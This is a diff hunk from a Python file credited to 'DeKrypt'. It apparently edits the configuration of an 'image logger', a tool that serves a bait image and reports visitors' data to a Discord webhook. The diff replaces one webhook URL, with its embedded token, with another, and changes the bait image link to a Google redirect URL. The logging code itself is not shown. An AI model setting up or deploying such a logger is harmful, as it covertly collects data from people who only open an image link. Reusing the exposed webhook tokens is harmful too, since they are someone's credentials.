@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1408075517751591003/YWHzrQjOn0Uhwhu6BVihGPSZRVN-dH1w2MoT9lSHoytFnnij0pPjHkos1TzQEp2YfHea",
-    "image": "https://ufsb.edu.br/pibid/images/phocagallery/galeria2/thumbs/phoca_thumb_l_image03_grd.png", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1409205815449223328/dviKBKGfIltqphHNFUALxt2H0c7iZTCuWC3CZc54hCsw97oPWlB4las1e09l4hyh-lBa",
+    "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fpt.wallpapers.com%2Ffundo-preto-simples&psig=AOvVaw0uvwueOXrv-sX9ijfiJ6HL&ust=1756137679311000&source=images&cd=vfe&opi=89978449&ved=0CBUQjRxqFwoTCMjtoeboo48DFQAAAAAdAAAAABAE", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
